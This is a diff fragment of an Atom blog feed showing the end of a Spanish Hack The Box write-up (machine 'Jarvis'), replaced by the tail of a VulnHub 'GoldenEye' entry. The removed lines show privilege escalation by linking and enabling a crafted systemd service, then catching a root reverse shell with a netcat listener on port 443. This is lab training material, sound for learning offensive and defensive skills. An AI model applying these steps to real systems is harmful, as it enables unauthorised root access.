-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pepper@jarvis:~/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt; /home/pepper/privesc/privesc.service 
-Created symlink /etc/systemd/system/privesc.service -&amp;gt; /home/pepper/privesc/privesc.service.
-pepper@jarvis:~/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--now&lt;/span&gt; /home/pepper/privesc/privesc.service
-Created symlink /etc/systemd/system/multi-user.target.wants/privesc.service -&amp;gt; /home/pepper/privesc/privesc.service.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.143] 39850
-bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1216&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
-bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
-root@jarvis:/# &lt;span class=&quot;nb&quot;&gt;whoami
-whoami
-&lt;/span&gt;root
-root@jarvis:/# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya nos encontramos como el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="SQL" /><category term="SQLi" /><category term="Injection" /><category term="Web" /><summary type="html">Resolución de la máquina Jarvis en la plataforma de Hack The Box</summary></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>K4miyo</name></author><category term="CMS" /><category term="Web" /><category term="POP3" /><category term="CC" /><summary type="html">Resolución de la máquina GoldenEye en la plataforma de VulnHub</summary></entry></feed>
